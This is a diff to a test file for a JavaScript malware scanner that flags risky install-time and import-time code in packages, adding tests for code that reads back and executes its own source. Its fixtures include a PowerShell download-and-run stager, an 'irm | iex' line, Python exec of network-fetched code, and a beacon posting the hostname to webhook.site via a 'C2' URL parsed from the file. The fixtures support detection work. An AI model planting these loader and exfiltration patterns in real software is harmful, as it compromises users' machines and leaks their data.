@@ -9,7 +9,7 @@ import { test } from "node:test";
 import assert from "node:assert/strict";
 import { Buffer } from "node:buffer";
 import { installScriptRisk, importTimeRisk, importTimeSeverity, scanFile } from "../src/index.js";
-import { powershellRisk, stagerAt, reverseShellAt, sendsHostInfo } from "../src/lib/hooks.js";
+import { powershellRisk, stagerAt, reverseShellAt, sendsHostInfo, readsOwnSource, runsOwnSourceAt } from "../src/lib/hooks.js";
 
 const PS_RUN = Buffer.from('Invoke-WebRequest -Uri "https://x.invalid/a.exe" -OutFile "a.exe"; '
   + 'Invoke-Expression "a.exe"', "utf16le").toString("base64");
@@ -81,13 +81,42 @@ test("import time: prose is read out, PowerShell must be handed to an exec call"
     + "        \"irm https://x.invalid/i.ps1 | iex\",\n    ]\n)\n";
   assert.deepEqual(importTimeRisk(run, "py"), [["runs PowerShell that downloads and runs code"], 4]);
   const runDoc = '"""\nimport urllib.request\nexec(urllib.request.urlopen("https://x.invalid/p").read())\n"""\nexec(__doc__)\n';
-  assert.deepEqual(importTimeRisk(runDoc, "py")[0], ["runs code it receives over the network"]);
+  assert.deepEqual(importTimeRisk(runDoc, "py")[0], ["runs code it receives over the network",
+    "runs code it reads back from its own file or a data file shipped with it"]);
   const beacon = 'requests.post("https://webhook.site/0", data=socket.gethostname())';
   for (const text of [`x = (\n    """${beacon}"""\n)\n`, `x = \\\n"""${beacon}"""\n`, `x = f(\n    'a'\n    """${beacon}"""\n)\n`,
     `f"""${beacon}"""\n`, `"""${beacon}""".strip()\n`]) {
     assert.ok(importTimeRisk(text, "py")[0].length, text);
   }
   assert.deepEqual(importTimeRisk(`x = 1\n"""\n${beacon}\n"""\n`, "py"), [[], null]);
+});
+
+test("code read back from the file itself", () => {
+  const OWN = "runs code it reads back from its own file or a data file shipped with it";
+  const c2 = "# C2: https://webhook.site/abc\nimport socket, requests, re\n"
+    + "url = re.search(r'# C2: (\\S+)', open(__file__).read()).group(1)\n"
+    + "requests.post(url, data=socket.gethostname())\n";
+  assert.ok(readsOwnSource(c2));
+  assert.deepEqual(importTimeRisk(c2, "py"), importTimeRisk(c2));
+  assert.equal(importTimeSeverity(importTimeRisk(c2, "py")[0]), "CRITICAL");
+  for (const [lang, text, line] of [
+    ["py", '"""\nimport os; os.system("id")\n"""\nexec(open(__file__).read().split(\'"""\')[1])\n', 4],
+    ["py", 'src = open(__file__).read()\ncode = src.split("#!")[1]\nexec(code)\n#!print(1)\n', 3],
+    ["py", '"""print(1)"""\nexec(__doc__)\n', 2],
+    ["js", "const fs = require('fs');\neval(fs.readFileSync(__filename, 'utf8').split('/*')[1].split('*/')[0]);\n"
+      + "/* require('child_process').execSync('id') */\n", 2],
+    ["js", "const p = (function(){/*require('child_process').execSync('id')*/}).toString();\n"
+      + "new Function(p.slice(p.indexOf('/*') + 2, p.lastIndexOf('*/')))();\n", 2]]) {
+    assert.deepEqual(importTimeRisk(text, lang), [[OWN], line], text);
+    assert.ok(installScriptRisk(text).includes(OWN), text);
+  }
+  assert.ok(runsOwnSourceAt('import os\nexec(open(os.path.join(os.path.dirname(__file__), "logo.png")).read())\n') >= 0);
+  for (const text of ["import os\nhere = os.path.dirname(__file__)\nexec(open(os.path.join(here, 'pkg', 'version.py')).read())\n",
+    '"""Tool."""\nimport argparse\np = argparse.ArgumentParser(description=__doc__)\n',
+    'SHIM = """exec(compile(open(__file__).read(), __file__, "exec"))"""\nsubprocess.run([py, "-c", SHIM])\n',
+    "NAMES = ('__doc__', '__name__')\nsrc = 'def f(): pass'\nexec(src)\n"]) {
+    assert.equal(runsOwnSourceAt(text), -1, text);
+  }
 });
 
 test("aliased decoders and decrypted payloads in the decode flow", () => {
